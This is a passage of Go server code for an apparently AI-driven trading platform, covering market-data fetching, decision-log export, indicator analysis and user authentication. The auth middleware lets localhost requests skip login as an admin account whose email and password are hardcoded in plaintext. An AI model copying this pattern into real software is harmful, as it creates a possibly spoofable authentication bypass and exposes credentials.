	return klines, nil
}

// getKlinesFromAlpaca fetches kline data from Alpaca API for US stocks
func (s *Server) getKlinesFromAlpaca(symbol, interval string, limit int) ([]market.Kline, error) {
	// Create Alpaca client
	client := alpaca.NewClient()

	// Map interval to Alpaca timeframe format
	timeframe := alpaca.MapTimeframe(interval)

	// Fetch bars from Alpaca
	ctx := context.Background()
	bars, err := client.GetBars(ctx, symbol, timeframe, limit)
	if err != nil {
		return nil, fmt.Errorf("alpaca API error: %w", err)
	}

	// Convert Alpaca bars to market.Kline format
	klines := make([]market.Kline, len(bars))
	for i, bar := range bars {
		klines[i] = market.Kline{
			OpenTime:    bar.Timestamp.UnixMilli(),
			Open:        bar.Open,
			High:        bar.High,
			Low:         bar.Low,
			Close:       bar.Close,
			Volume:      float64(bar.Volume),             // 股数
			QuoteVolume: float64(bar.Volume) * bar.Close, // 成交额 = 股数 * 收盘价 (USD)
			CloseTime:   bar.Timestamp.UnixMilli(),
		}
	}

	return klines, nil
}

// getKlinesFromTwelveData fetches kline data from Twelve Data API for forex and metals
func (s *Server) getKlinesFromTwelveData(symbol, interval string, limit int) ([]market.Kline, error) {
	// Create Twelve Data client
	client := twelvedata.NewClient()

	// Map interval to Twelve Data timeframe format
	timeframe := twelvedata.MapTimeframe(interval)

	// Fetch time series from Twelve Data
	ctx := context.Background()
	result, err := client.GetTimeSeries(ctx, symbol, timeframe, limit)
	if err != nil {
		return nil, fmt.Errorf("twelvedata API error: %w", err)
	}

	// Convert Twelve Data bars to market.Kline format
	// Note: Twelve Data returns bars in reverse order (newest first)
	klines := make([]market.Kline, len(result.Values))
	for i, bar := range result.Values {
		open, high, low, close, volume, timestamp, err := twelvedata.ParseBar(bar)
		if err != nil {
			logger.Warnf("⚠️ Failed to parse TwelveData bar: %v", err)
			continue
		}

		// Reverse order: put oldest first
		idx := len(result.Values) - 1 - i
		klines[idx] = market.Kline{
			OpenTime:  timestamp,
			Open:      open,
			High:      high,
			Low:       low,
			Close:     close,
			Volume:    volume,
			CloseTime: timestamp,
		}
	}

	return klines, nil
}

// getKlinesFromHyperliquid fetches kline data from Hyperliquid API
// Supports both crypto perps (default dex) and stock perps/forex/commodities (xyz dex)
func (s *Server) getKlinesFromHyperliquid(symbol, interval string, limit int) ([]market.Kline, error) {
	// Create Hyperliquid client
	client := hyperliquid.NewClient()

	// Map interval to Hyperliquid format
	timeframe := hyperliquid.MapTimeframe(interval)

	// Fetch candles from Hyperliquid
	// FormatCoinForAPI will automatically add xyz: prefix for stock perps
	ctx := context.Background()
	candles, err := client.GetCandles(ctx, symbol, timeframe, limit)
	if err != nil {
		return nil, fmt.Errorf("hyperliquid API error: %w", err)
	}

	// Convert Hyperliquid candles to market.Kline format
	klines := make([]market.Kline, len(candles))
	for i, candle := range candles {
		open, _ := strconv.ParseFloat(candle.Open, 64)
		high, _ := strconv.ParseFloat(candle.High, 64)
		low, _ := strconv.ParseFloat(candle.Low, 64)
		close, _ := strconv.ParseFloat(candle.Close, 64)
		volume, _ := strconv.ParseFloat(candle.Volume, 64)

		klines[i] = market.Kline{
			OpenTime:    candle.OpenTime,
			Open:        open,
			High:        high,
			Low:         low,
			Close:       close,
			Volume:      volume,         // 合约数量
			QuoteVolume: volume * close, // 成交额 (USD)
			CloseTime:   candle.CloseTime,
		}
	}

	return klines, nil
}

// handleSymbols returns available symbols for a given exchange
func (s *Server) handleSymbols(c *gin.Context) {
	exchange := c.DefaultQuery("exchange", "hyperliquid")

	type SymbolInfo struct {
		Symbol      string `json:"symbol"`
		Name        string `json:"name"`
		Category    string `json:"category"` // crypto, stock, forex, commodity, index
		MaxLeverage int    `json:"maxLeverage,omitempty"`
	}

	var symbols []SymbolInfo

	switch strings.ToLower(exchange) {
	case "hyperliquid", "hyperliquid-xyz", "xyz":
		// Fetch symbols from Hyperliquid
		client := hyperliquid.NewClient()
		ctx := context.Background()

		// Get crypto perps from default dex
		if exchange == "hyperliquid" || exchange == "hyperliquid-xyz" {
			mids, err := client.GetAllMids(ctx)
			if err == nil {
				for symbol := range mids {
					// Skip spot tokens (start with @)
					if strings.HasPrefix(symbol, "@") {
						continue
					}
					symbols = append(symbols, SymbolInfo{
						Symbol:   symbol,
						Name:     symbol,
						Category: "crypto",
					})
				}
			}
		}

		// Get xyz dex symbols (stocks, forex, commodities)
		xyzMids, err := client.GetAllMidsXYZ(ctx)
		if err == nil {
			for symbol := range xyzMids {
				// Remove xyz: prefix for display
				displaySymbol := strings.TrimPrefix(symbol, "xyz:")
				category := "stock"
				if displaySymbol == "GOLD" || displaySymbol == "SILVER" {
					category = "commodity"
				} else if displaySymbol == "EUR" || displaySymbol == "JPY" {
					category = "forex"
				} else if displaySymbol == "XYZ100" {
					category = "index"
				}
				symbols = append(symbols, SymbolInfo{
					Symbol:   displaySymbol,
					Name:     displaySymbol,
					Category: category,
				})
			}
		}

	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "Unsupported exchange for symbol listing"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"exchange": exchange,
		"symbols":  symbols,
		"count":    len(symbols),
	})
}

// handleDecisions Decision log list
func (s *Server) handleDecisions(c *gin.Context) {
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}

	// Get all historical decision records (unlimited)
	records, err := trader.GetStore().Decision().GetLatestRecords(trader.GetID(), 10000)
	if err != nil {
		SafeInternalError(c, "Get decision log", err)
		return
	}

	c.JSON(http.StatusOK, records)
}

// handleLatestDecisions Latest decision logs (newest first, supports limit parameter)
func (s *Server) handleLatestDecisions(c *gin.Context) {
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}

	// Get limit from query parameter, default to 5
	limit := 5
	if limitStr := c.Query("limit"); limitStr != "" {
		if parsedLimit, err := strconv.Atoi(limitStr); err == nil && parsedLimit > 0 {
			limit = parsedLimit
			if limit > 100 {
				limit = 100 // Max 100 to prevent abuse
			}
		}
	}

	records, err := trader.GetStore().Decision().GetLatestRecords(trader.GetID(), limit)
	if err != nil {
		SafeInternalError(c, "Get decision log", err)
		return
	}

	// Reverse array to put newest first (for list display)
	// GetLatestRecords returns oldest to newest (for charts), here we need newest to oldest
	for i, j := 0, len(records)-1; i < j; i, j = i+1, j-1 {
		records[i], records[j] = records[j], records[i]
	}

	c.JSON(http.StatusOK, records)
}

// handleDecisionsExport exports AI decision records in machine-readable JSON (for bots/analysis).
// Query: trader_id (required), from, to (ISO8601 or YYYY-MM-DD), or period=last_24h|last_7d|last_30d.
// Optional: include_prompts=1 to include system_prompt and input_prompt in each record.
func (s *Server) handleDecisionsExport(c *gin.Context) {
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}

	var fromTime, toTime time.Time
	toTime = time.Now().UTC()
	if period := c.Query("period"); period != "" {
		switch period {
		case "last_24h":
			fromTime = toTime.Add(-24 * time.Hour)
		case "last_7d":
			fromTime = toTime.AddDate(0, 0, -7)
		case "last_30d":
			fromTime = toTime.AddDate(0, 0, -30)
		default:
			SafeBadRequest(c, "period must be last_24h, last_7d, or last_30d")
			return
		}
	} else {
		fromStr := c.Query("from")
		toStr := c.Query("to")
		if fromStr == "" || toStr == "" {
			SafeBadRequest(c, "Either period or both from and to (ISO8601/YYYY-MM-DD) are required")
			return
		}
		for _, pair := range []struct {
			s *string
			t *time.Time
		}{
			{&fromStr, &fromTime},
			{&toStr, &toTime},
		} {
			*pair.t, err = parseExportTime(*pair.s)
			if err != nil {
				SafeBadRequest(c, "Invalid time format: use ISO8601 or YYYY-MM-DD")
				return
			}
		}
		if fromTime.After(toTime) {
			fromTime, toTime = toTime, fromTime
		}
	}

	records, err := trader.GetStore().Decision().GetRecordsInRange(trader.GetID(), fromTime, toTime)
	if err != nil {
		SafeInternalError(c, "Export decisions", err)
		return
	}

	includePrompts := c.Query("include_prompts") == "1" || c.Query("include_prompts") == "true"
	exported := make([]map[string]interface{}, len(records))
	for i, r := range records {
		row := map[string]interface{}{
			"cycle_number": r.CycleNumber,
			"timestamp":    r.Timestamp.Format(time.RFC3339),
			"success":      r.Success,
			"decisions":    r.Decisions,
		}
		if includePrompts {
			row["system_prompt"] = r.SystemPrompt
			row["input_prompt"] = r.InputPrompt
		}
		exported[i] = row
	}

	out := map[string]interface{}{
		"exporter_version": 1,
		"trader_id":        traderID,
		"from":             fromTime.Format(time.RFC3339),
		"to":               toTime.Format(time.RFC3339),
		"exported_at":      time.Now().UTC().Format(time.RFC3339),
		"count":            len(exported),
		"records":          exported,
	}
	c.JSON(http.StatusOK, out)
}

func parseExportTime(s string) (time.Time, error) {
	if t, err := time.Parse(time.RFC3339, s); err == nil {
		return t.UTC(), nil
	}
	if t, err := time.Parse("2006-01-02", s); err == nil {
		return time.Date(t.Year(), t.Month(), t.Day(), 0, 0, 0, 0, time.UTC), nil
	}
	return time.Time{}, fmt.Errorf("invalid time: %s", s)
}

// handleStatistics Statistics information
func (s *Server) handleStatistics(c *gin.Context) {
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}

	stats, err := trader.GetStore().Decision().GetStatistics(trader.GetID())
	if err != nil {
		SafeInternalError(c, "Get statistics", err)
		return
	}

	c.JSON(http.StatusOK, stats)
}

// handleIndicatorAnalysis performs historical indicator attribution analysis for a trader's closed positions.
// It groups trades into winners (RealizedPnL > 0) and losers (<= 0), then computes average indicator values
// at entry and exit timestamps for both groups.
//
// Query parameters:
// - trader_id   (required, via getTraderFromQuery)
// - timeframe   (optional, default "5m")
// - rsi_period  (optional, default 14)
// - ema_period  (optional, default 20)
// - start_time  (optional, RFC3339 or YYYY-MM-DD; if omitted, uses earliest entry_time)
// - end_time    (optional, RFC3339 or YYYY-MM-DD; if omitted, uses latest exit_time)
// - limit       (optional, default 500; max closed positions to consider)
func (s *Server) handleIndicatorAnalysis(c *gin.Context) {
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}

	tf := c.DefaultQuery("timeframe", "5m")
	normTF, err := market.NormalizeTimeframe(tf)
	if err != nil {
		SafeBadRequest(c, fmt.Sprintf("Invalid timeframe: %v", err))
		return
	}

	// Log which market source is used for indicator analysis
	cfg := config.Get()
	source := cfg.MarketSource
	if source == "" {
		source = "coinank"
	}
	logger.Infof("📊 Indicator Analysis using MarketSource=%s timeframe=%s trader=%s", source, normTF, traderID)

	rsiPeriod := 14
	if v := c.DefaultQuery("rsi_period", "14"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 200 {
			rsiPeriod = n
		}
	}
	emaPeriod := 20
	if v := c.DefaultQuery("ema_period", "20"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 300 {
			emaPeriod = n
		}
	}
	// MACD 参数（可选），用于分析期内的 MACD 指标
	macdFast := 12
	if v := c.DefaultQuery("macd_fast", "12"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 100 {
			macdFast = n
		}
	}
	macdSlow := 26
	if v := c.DefaultQuery("macd_slow", "26"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > macdFast && n <= 200 {
			macdSlow = n
		}
	}
	macdSignal := 9
	if v := c.DefaultQuery("macd_signal", "9"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 100 {
			macdSignal = n
		}
	}
	// 放量指标：当前K线成交量 / 前N根K线成交量平均值，N 可配置
	volMultBars := 5
	if v := c.DefaultQuery("vol_mult_bars", "5"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 1 && n <= 100 {
			volMultBars = n
		}
	}

	var fromFilterMs, toFilterMs int64
	var hasFrom, hasTo bool
	if sVal := c.Query("start_time"); sVal != "" {
		if t, err := parseExportTime(sVal); err == nil {
			fromFilterMs = t.UnixMilli()
			hasFrom = true
		} else {
			SafeBadRequest(c, "Invalid start_time")
			return
		}
	}
	if sVal := c.Query("end_time"); sVal != "" {
		if t, err := parseExportTime(sVal); err == nil {
			toFilterMs = t.UnixMilli()
			hasTo = true
		} else {
			SafeBadRequest(c, "Invalid end_time")
			return
		}
	}

	limit := 500
	if v := c.DefaultQuery("limit", "500"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 2000 {
			limit = n
		}
	}

	traderStore := trader.GetStore()
	if traderStore == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Store not available"})
		return
	}

	positions, err := traderStore.Position().GetClosedPositions(trader.GetID(), limit)
	if err != nil {
		SafeInternalError(c, "Get closed positions", err)
		return
	}
	if len(positions) == 0 {
		c.JSON(http.StatusOK, gin.H{
			"trader_id":        traderID,
			"timeframe":        normTF,
			"rsi_period":       rsiPeriod,
			"ema_period":       emaPeriod,
			"vol_mult_bars":    volMultBars,
			"from":             nil,
			"to":               nil,
			"trade_count":      0,
			"indicators_all":   map[string]interface{}{},
			"indicators_long":  map[string]interface{}{},
			"indicators_short": map[string]interface{}{},
		})
		return
	}

	// Filter by time window and compute overall from/to bounds.
	filtered := make([]*store.TraderPosition, 0, len(positions))
	var overallFromMs, overallToMs int64
	for _, p := range positions {
		if p.EntryTime <= 0 || p.ExitTime <= 0 || p.Symbol == "" {
			continue
		}
		if hasFrom && p.EntryTime < fromFilterMs {
			continue
		}
		if hasTo && p.ExitTime > toFilterMs {
			continue
		}
		filtered = append(filtered, p)
		if overallFromMs == 0 || p.EntryTime < overallFromMs {
			overallFromMs = p.EntryTime
		}
		if overallToMs == 0 || p.ExitTime > overallToMs {
			overallToMs = p.ExitTime
		}
	}

	if len(filtered) == 0 {
		c.JSON(http.StatusOK, gin.H{
			"trader_id":        traderID,
			"timeframe":        normTF,
			"rsi_period":       rsiPeriod,
			"ema_period":       emaPeriod,
			"vol_mult_bars":    volMultBars,
			"from":             nil,
			"to":               nil,
			"trade_count":      0,
			"indicators_all":   map[string]interface{}{},
			"indicators_long":  map[string]interface{}{},
			"indicators_short": map[string]interface{}{},
		})
		return
	}

	// Pre-computed path: read EntryIndicatorsJSON/ExitIndicatorsJSON from DB (秒开，no GetKlinesRange)
	// Legacy positions with empty JSON are skipped (graceful degradation).
	// Slices hold raw values for median calculation.
	type indicatorBucket struct {
		profitEntrySum float64
		profitEntryCnt int
		profitEntryVals []float64
		profitExitSum   float64
		profitExitCnt  int
		profitExitVals  []float64
		lossEntrySum    float64
		lossEntryCnt   int
		lossEntryVals   []float64
		lossExitSum     float64
		lossExitCnt    int
		lossExitVals    []float64
	}

	indicatorNames := []string{"rsi", "emabias", "boll_pct", "atr_pct", "macd", "adx", "bias", "vol_mult"}
	newBuckets := func() map[string]*indicatorBucket {
		m := make(map[string]*indicatorBucket)
		for _, n := range indicatorNames {
			m[n] = &indicatorBucket{}
		}
		return m
	}
	indicatorsAll := newBuckets()
	indicatorsLong := newBuckets()
	indicatorsShort := newBuckets()

	addSample := func(indicators map[string]*indicatorBucket, name string, value float64, isWin bool, isEntry bool) {
		bucket, ok := indicators[name]
		if !ok {
			return
		}
		if math.IsNaN(value) || math.IsInf(value, 0) {
			return
		}
		if isWin {
			if isEntry {
				bucket.profitEntrySum += value
				bucket.profitEntryCnt++
				bucket.profitEntryVals = append(bucket.profitEntryVals, value)
			} else {
				bucket.profitExitSum += value
				bucket.profitExitCnt++
				bucket.profitExitVals = append(bucket.profitExitVals, value)
			}
		} else {
			if isEntry {
				bucket.lossEntrySum += value
				bucket.lossEntryCnt++
				bucket.lossEntryVals = append(bucket.lossEntryVals, value)
			} else {
				bucket.lossExitSum += value
				bucket.lossExitCnt++
				bucket.lossExitVals = append(bucket.lossExitVals, value)
			}
		}
	}
	addSampleAllSides := func(name string, value float64, isWin bool, isEntry bool, side string) {
		addSample(indicatorsAll, name, value, isWin, isEntry)
		sideUpper := strings.ToUpper(side)
		if sideUpper == "LONG" {
			addSample(indicatorsLong, name, value, isWin, isEntry)
		} else if sideUpper == "SHORT" {
			addSample(indicatorsShort, name, value, isWin, isEntry)
		}
	}

	// Iterate positions: parse pre-computed EntryIndicatorsJSON/ExitIndicatorsJSON (no network)
	for _, p := range filtered {
		isWin := p.RealizedPnL > 0
		side := p.Side
		if side == "" {
			side = "LONG"
		}

		// Entry snapshot from DB (skip legacy positions with empty JSON)
		if p.EntryIndicatorsJSON != "" {
			var snap market.IndicatorSnapshot
			if json.Unmarshal([]byte(p.EntryIndicatorsJSON), &snap) == nil {
				addSampleAllSides("rsi", snap.RSI, isWin, true, side)
				addSampleAllSides("emabias", snap.EMABias, isWin, true, side)
				addSampleAllSides("boll_pct", snap.BollPct, isWin, true, side)
				addSampleAllSides("atr_pct", snap.ATRPct, isWin, true, side)
				addSampleAllSides("macd", snap.MACD, isWin, true, side)
				addSampleAllSides("adx", snap.ADX, isWin, true, side)
				addSampleAllSides("bias", snap.Bias, isWin, true, side)
				addSampleAllSides("vol_mult", snap.VolMult, isWin, true, side)
			}
		}

		// Exit snapshot from DB
		if p.ExitIndicatorsJSON != "" {
			var snap market.IndicatorSnapshot
			if json.Unmarshal([]byte(p.ExitIndicatorsJSON), &snap) == nil {
				addSampleAllSides("rsi", snap.RSI, isWin, false, side)
				addSampleAllSides("emabias", snap.EMABias, isWin, false, side)
				addSampleAllSides("boll_pct", snap.BollPct, isWin, false, side)
				addSampleAllSides("atr_pct", snap.ATRPct, isWin, false, side)
				addSampleAllSides("macd", snap.MACD, isWin, false, side)
				addSampleAllSides("adx", snap.ADX, isWin, false, side)
				addSampleAllSides("bias", snap.Bias, isWin, false, side)
				addSampleAllSides("vol_mult", snap.VolMult, isWin, false, side)
			}
		}
	}

	// CalculateMedian returns the median of values (in-place sort; even length = avg of two middle).
	calculateMedian := func(values []float64) float64 {
		if len(values) == 0 {
			return 0
		}
		cp := make([]float64, len(values))
		copy(cp, values)
		sort.Float64s(cp)
		n := len(cp)
		if n%2 == 1 {
			return cp[n/2]
		}
		return (cp[n/2-1] + cp[n/2]) / 2
	}

	// Build response structure with averages and medians (per dimension: all / long / short).
	type indicatorDimensionAverages struct {
		ProfitEntryAvg    float64 `json:"profit_entry_avg"`
		ProfitEntryMedian float64 `json:"profit_entry_median"`
		ProfitExitAvg     float64 `json:"profit_exit_avg"`
		ProfitExitMedian  float64 `json:"profit_exit_median"`
		LossEntryAvg      float64 `json:"loss_entry_avg"`
		LossEntryMedian   float64 `json:"loss_entry_median"`
		LossExitAvg       float64 `json:"loss_exit_avg"`
		LossExitMedian    float64 `json:"loss_exit_median"`

		ProfitEntryCount int `json:"profit_entry_count"`
		ProfitExitCount  int `json:"profit_exit_count"`
		LossEntryCount   int `json:"loss_entry_count"`
		LossExitCount    int `json:"loss_exit_count"`
	}

	buildResult := func(indicators map[string]*indicatorBucket) map[string]indicatorDimensionAverages {
		out := make(map[string]indicatorDimensionAverages)
		for name, b := range indicators {
			if b == nil {
				continue
			}
			res := indicatorDimensionAverages{
				ProfitEntryCount: b.profitEntryCnt,
				ProfitExitCount:  b.profitExitCnt,
				LossEntryCount:   b.lossEntryCnt,
				LossExitCount:    b.lossExitCnt,
			}
			if b.profitEntryCnt > 0 {
				res.ProfitEntryAvg = b.profitEntrySum / float64(b.profitEntryCnt)
				res.ProfitEntryMedian = calculateMedian(b.profitEntryVals)
			}
			if b.profitExitCnt > 0 {
				res.ProfitExitAvg = b.profitExitSum / float64(b.profitExitCnt)
				res.ProfitExitMedian = calculateMedian(b.profitExitVals)
			}
			if b.lossEntryCnt > 0 {
				res.LossEntryAvg = b.lossEntrySum / float64(b.lossEntryCnt)
				res.LossEntryMedian = calculateMedian(b.lossEntryVals)
			}
			if b.lossExitCnt > 0 {
				res.LossExitAvg = b.lossExitSum / float64(b.lossExitCnt)
				res.LossExitMedian = calculateMedian(b.lossExitVals)
			}
			out[name] = res
		}
		return out
	}

	c.JSON(http.StatusOK, gin.H{
		"trader_id":        traderID,
		"timeframe":        normTF,
		"rsi_period":       rsiPeriod,
		"ema_period":       emaPeriod,
		"macd_fast":        macdFast,
		"macd_slow":        macdSlow,
		"macd_signal":      macdSignal,
		"vol_mult_bars":    volMultBars,
		"from":             overallFromMs,
		"to":               overallToMs,
		"trade_count":      len(filtered),
		"indicators_all":   buildResult(indicatorsAll),
		"indicators_long":  buildResult(indicatorsLong),
		"indicators_short": buildResult(indicatorsShort),
	})
}

// handleCompetition Competition overview (compare all traders)
func (s *Server) handleCompetition(c *gin.Context) {
	userID := c.GetString("user_id")

	// Ensure user's traders are loaded into memory
	err := s.traderManager.LoadUserTradersFromStore(s.store, userID)
	if err != nil {
		logger.Infof("⚠️ Failed to load traders for user %s: %v", userID, err)
	}

	competition, err := s.traderManager.GetCompetitionData()
	if err != nil {
		SafeInternalError(c, "Get competition data", err)
		return
	}

	c.JSON(http.StatusOK, competition)
}

// handleEquityHistory Return rate historical data
// Query directly from database, not dependent on trader in memory (so historical data can be retrieved after restart)
func (s *Server) handleEquityHistory(c *gin.Context) {
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	// Get equity historical data from new equity table
	// Every 3 minutes per cycle: 10000 records = about 20 days of data
	snapshots, err := s.store.Equity().GetLatest(traderID, 10000)
	if err != nil {
		SafeInternalError(c, "Get historical data", err)
		return
	}

	if len(snapshots) == 0 {
		c.JSON(http.StatusOK, []interface{}{})
		return
	}

	// Build return rate historical data points
	type EquityPoint struct {
		Timestamp        string  `json:"timestamp"`
		TotalEquity      float64 `json:"total_equity"`      // Account equity (wallet + unrealized)
		AvailableBalance float64 `json:"available_balance"` // Available balance
		TotalPnL         float64 `json:"total_pnl"`         // Total PnL (unrealized PnL)
		TotalPnLPct      float64 `json:"total_pnl_pct"`     // Total PnL percentage
		PositionCount    int     `json:"position_count"`    // Position count
		MarginUsedPct    float64 `json:"margin_used_pct"`   // Margin used percentage
	}

	// Use the balance of the first record as initial balance to calculate return rate
	initialBalance := snapshots[0].Balance
	if initialBalance == 0 {
		initialBalance = 1 // Avoid division by zero
	}

	var history []EquityPoint
	for _, snap := range snapshots {
		// Calculate PnL percentage
		totalPnLPct := 0.0
		if initialBalance > 0 {
			totalPnLPct = (snap.UnrealizedPnL / initialBalance) * 100
		}

		history = append(history, EquityPoint{
			Timestamp:        snap.Timestamp.Format("2006-01-02 15:04:05"),
			TotalEquity:      snap.TotalEquity,
			AvailableBalance: snap.Balance,
			TotalPnL:         snap.UnrealizedPnL,
			TotalPnLPct:      totalPnLPct,
			PositionCount:    snap.PositionCount,
			MarginUsedPct:    snap.MarginUsedPct,
		})
	}

	c.JSON(http.StatusOK, history)
}

// isLocalhost 是否为本地访问（127.0.0.1 或 ::1）
func isLocalhost(c *gin.Context) bool {
	ip := c.ClientIP()
	return ip == "127.0.0.1" || ip == "::1"
}

// allowBypassLogin 是否允许用固定账号密码直接登录（免 OTP）。本地访问或 .env 中 ALLOW_BYPASS_LOGIN=1 时允许（仅用于自托管服务器）。
func allowBypassLogin(c *gin.Context) bool {
	if isLocalhost(c) {
		return true
	}
	return os.Getenv("ALLOW_BYPASS_LOGIN") == "1" || strings.ToLower(strings.TrimSpace(os.Getenv("ALLOW_BYPASS_LOGIN"))) == "true"
}

const (
	localBypassEmail    = "2326840417@qq.com"
	localBypassPassword = "2326840417a.A"
)

// ensureLocalAdminUser 确保本地免登录账号存在且密码正确
func (s *Server) ensureLocalAdminUser() (*store.User, error) {
	user, err := s.store.User().GetByEmail(localBypassEmail)
	if err != nil {
		hash, err := auth.HashPassword(localBypassPassword)
		if err != nil {
			return nil, err
		}
		user = &store.User{
			ID:           uuid.New().String(),
			Email:        localBypassEmail,
			PasswordHash: hash,
			OTPVerified:  true,
		}
		if err := s.store.User().Create(user); err != nil {
			return nil, err
		}
		return user, nil
	}
	if !auth.CheckPassword(localBypassPassword, user.PasswordHash) {
		hash, err := auth.HashPassword(localBypassPassword)
		if err != nil {
			return nil, err
		}
		_ = s.store.User().UpdatePassword(user.ID, hash)
		user.PasswordHash = hash
	}
	return user, nil
}

// authMiddleware JWT authentication middleware
func (s *Server) authMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		// 本地环境：127.0.0.1 / ::1 直接放行，注入 admin 身份
		if isLocalhost(c) {
			user, err := s.ensureLocalAdminUser()
			if err == nil {
				c.Set("user_id", user.ID)
				c.Set("email", user.Email)
				c.Next()
				return
			}
		}

		authHeader := c.GetHeader("Authorization")
		if authHeader == "" {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "Missing Authorization header"})
			c.Abort()
			return
		}

		// Check Bearer token format
		tokenParts := strings.Split(authHeader, " ")
		if len(tokenParts) != 2 || tokenParts[0] != "Bearer" {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid Authorization format"})
			c.Abort()
			return
		}

		tokenString := tokenParts[1]

		// Blacklist check
		if auth.IsTokenBlacklisted(tokenString) {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "Token expired, please login again"})
			c.Abort()
			return
		}

		// Validate JWT token
		claims, err := auth.ValidateJWT(tokenString)
		if err != nil {
			logger.Errorf("[Auth] Invalid token: %v", err)
			c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid or expired token"})
			c.Abort()
			return
		}

		// Store user information in context
		c.Set("user_id", claims.UserID)
		c.Set("email", claims.Email)
		c.Next()
	}
}

// handleLogout Add current token to blacklist
func (s *Server) handleLogout(c *gin.Context) {
	authHeader := c.GetHeader("Authorization")
	if authHeader == "" {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Missing Authorization header"})
		return
	}
	parts := strings.Split(authHeader, " ")
	if len(parts) != 2 || parts[0] != "Bearer" {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid Authorization format"})
		return
	}
	tokenString := parts[1]
	claims, err := auth.ValidateJWT(tokenString)
	if err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid token"})
		return
	}
	var exp time.Time
	if claims.ExpiresAt != nil {
		exp = claims.ExpiresAt.Time
	} else {
		exp = time.Now().Add(24 * time.Hour)
	}
	auth.BlacklistToken(tokenString, exp)
	c.JSON(http.StatusOK, gin.H{"message": "Logged out"})
}

// handleRegister Handle user registration request
func (s *Server) handleRegister(c *gin.Context) {
	// Check if registration is allowed
	if !config.Get().RegistrationEnabled {
		c.JSON(http.StatusForbidden, gin.H{"error": "Registration is disabled"})
		return
	}

	var req struct {
		Email    string `json:"email" binding:"required,email"`
		Password string `json:"password" binding:"required,min=6"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		SafeBadRequest(c, "Invalid request parameters")
		return
	}

	// Check if email already exists (must check before maxUsers to allow incomplete OTP users)
	existingUser, err := s.store.User().GetByEmail(req.Email)
	if err == nil {
		// User exists, check OTP verification status
		if !existingUser.OTPVerified {
			// OTP not verified, verify password first for security
			if !auth.CheckPassword(req.Password, existingUser.PasswordHash) {
				c.JSON(http.StatusUnauthorized, gin.H{"error": "Email or password incorrect"})
				return
			}
			// Password correct, allow user to continue OTP setup
			// Return existing OTP information
			qrCodeURL := auth.GetOTPQRCodeURL(existingUser.OTPSecret, req.Email)
			c.JSON(http.StatusOK, gin.H{
				"user_id":     existingUser.ID,
				"email":       existingUser.Email,
				"otp_secret":  existingUser.OTPSecret,
				"qr_code_url": qrCodeURL,
				"message":     "Incomplete registration detected, please continue OTP setup",
			})
			return
		}
		// OTP already verified, reject duplicate registration
		c.JSON(http.StatusConflict, gin.H{"error": "Email already registered"})
		return
	}

	// Check max users limit (only for new users)
	maxUsers := config.Get().MaxUsers
	if maxUsers > 0 {
		userCount, err := s.store.User().Count()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to check user count"})
			return
		}
		if userCount >= maxUsers {
			c.JSON(http.StatusForbidden, gin.H{"error": "Not on whitelist"})
			return
		}
	}

	// Generate password hash
	passwordHash, err := auth.HashPassword(req.Password)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Password processing failed"})
		return
	}

	// Generate OTP secret
	otpSecret, err := auth.GenerateOTPSecret()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "OTP secret generation failed"})
		return
	}

	// Create user (unverified OTP status)
	userID := uuid.New().String()
	user := &store.User{
		ID:           userID,
		Email:        req.Email,
		PasswordHash: passwordHash,
		OTPSecret:    otpSecret,
		OTPVerified:  false,
	}

	err = s.store.User().Create(user)
	if err != nil {
		SafeInternalError(c, "Failed to create user", err)
		return
	}

	// Return OTP setup information
	qrCodeURL := auth.GetOTPQRCodeURL(otpSecret, req.Email)
	c.JSON(http.StatusOK, gin.H{
		"user_id":     userID,
		"email":       req.Email,
		"otp_secret":  otpSecret,
		"qr_code_url": qrCodeURL,
		"message":     "Please scan the QR code with Google Authenticator and verify OTP",
	})
}

// handleCompleteRegistration Complete registration (verify OTP)
func (s *Server) handleCompleteRegistration(c *gin.Context) {
	var req struct {
		UserID  string `json:"user_id" binding:"required"`
		OTPCode string `json:"otp_code" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		SafeBadRequest(c, "Invalid request parameters")
